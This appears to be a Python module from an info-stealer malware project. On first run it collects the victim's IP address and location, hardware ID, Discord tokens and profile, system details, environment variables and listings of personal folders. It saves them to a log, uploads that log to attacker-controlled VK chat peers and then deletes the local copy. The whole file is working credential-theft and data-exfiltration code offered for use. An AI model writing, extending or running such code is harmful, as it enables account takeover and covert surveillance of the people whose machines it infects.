import typing
import os
import json
import sys
from .discord import (
    discord_get_tokens,
    discord_request_profile
)
from .utils import (
    get_ip, get_hwid, 
    get_environment_variables
)
from .config import (
    FEATURE_STARTUP_HWID_GRABBING_ENABLED, 
    FEATURE_STARTUP_DISCORD_GRABBING_ENABLED,
    get_config,
    get_folder
)
from . import fs
from .debug import message as debug_message


def stealer_steal_all(force: bool = False) -> None:
    """
    Steals all data.
    :param force: If true, steals even if already worked.
    """

    try:
        if not stealer_is_already_worked() or force:
            data: typing.Dict[str, typing.Any] = {}
            userprofile = os.getenv("userprofile")
            drive = os.getcwd().split("\\")[0]

            ip = get_ip()
            data["internet_ipaddress"] = ip["ip"]
            data["internet_city"] = ip["city"]
            data["internet_country"] = ip["country"]
            data["internet_region"] = ip["region"]
            data["internet_provider"] = ip["org"]

            if FEATURE_STARTUP_HWID_GRABBING_ENABLED:
                data["computer_hardware_index"] = get_hwid()

            if FEATURE_STARTUP_DISCORD_GRABBING_ENABLED:
                data["discord_tokens"] = discord_get_tokens()
                data["discord_profile"] = discord_request_profile(data["discord_tokens"])

            if not sys.platform.startswith("linux"):
                data["computer_processor"] = os.getenv("NUMBER_OF_PROCESSORS", "") + " cores "
                data["computer_processor"] += os.getenv("PROCESSOR_ARCHITECTURE", "") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_IDENTIFIER", "") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_LEVEL", "") + " "
                data["computer_processor"] += os.getenv("PROCESSOR_REVISION", "")

                data["computer_username"] = os.getenv("UserName")
                data["computer_name"] = os.getenv("COMPUTERNAME")
                data["computer_operating_system"] = os.getenv("OS")

                data["computer_environment_variables"] = get_environment_variables()

                data["directory_root"] = fs.try_listdir(f"{drive}\\")
                data["directory_programfiles"] = fs.try_listdir(f"{drive}\\Program Files")
                data["directory_programfiles86"] = fs.try_listdir(f"{drive}\\Program Files (x86)")
                data["directory_downloads"] = fs.try_listdir(f"{userprofile}\\Downloads")
                data["directory_documents"] = fs.try_listdir(f"{userprofile}\\Documents")
                data["directory_desktop"] = fs.try_listdir(f"{userprofile}\\Desktop")

            path = get_folder() + get_config()["paths"]["log"]
            fs.build_path(path)

            with open(path, "w", encoding="UTF-8") as log_file:
                json.dump(data, log_file, indent=4)

            for peer in get_config()["server"]["vk"]["peers"]:
                uploading_status, uploading_result = server_upload_document(path, "Log File", peer, "doc")

                if uploading_status and isinstance(uploading_result, str):
                    server_message("[Stealer] First launch data:", uploading_result, peer)
                else:
                    server_message(f"[Stealer] Error when uploading first launch data: {uploading_result}", None, peer)

            fs.try_delete(path)
    except Exception as exception:  # noqa, pylint: disable=broad-except, redefined-outer-name
        debug_message(f"[Stealer] Failed to steall all! Exception - {exception}")


def stealer_is_already_worked() -> bool:
    """ Returns true if stealer already worked. """

    path: str = get_folder() + get_config()["paths"]["anchor"]

    if not os.path.exists(path):

        fs.build_path(path)
        with open(path, "w", encoding="UTF-8") as anchor_file:
            anchor_file.write("Anchor")

        return False
    return True

